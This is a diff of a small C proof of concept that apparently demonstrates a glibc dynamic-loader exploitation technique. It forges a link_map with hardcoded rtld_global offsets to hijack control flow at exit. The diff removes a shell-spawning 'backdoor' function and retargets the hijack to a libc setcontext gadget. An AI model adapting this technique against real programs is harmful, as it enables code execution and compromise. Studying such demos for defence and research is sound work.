@@ -4,14 +4,10 @@
 #include <unistd.h>
 #define rtld_global 0x23c060
 #define rtld_global_3_next 0x1f2018
+#define setcontext 0x54f5d
 
 void func() { 
 	printf("hello world\n");
-}
-
-void backdoor() {
-	puts("you hacked me!!");
-	system("/bin/sh");
 }
 
 int main() {
@@ -42,8 +38,10 @@ int main() {
 	link_map[33] = (size_t)&link_map[36];
 	link_map[34] = (size_t)&link_map[34];
 	link_map[35] = 16;
-	link_map[36] = (size_t)backdoor;
+	link_map[36] = (size_t)(libc_base + setcontext);
 	link_map[37] = (size_t)func;
+	link_map[49] = 0xdeadbeef; // r15
+	
 	*(int*)((char*)link_map + 0x30c) = 8;
 
 	return 0;
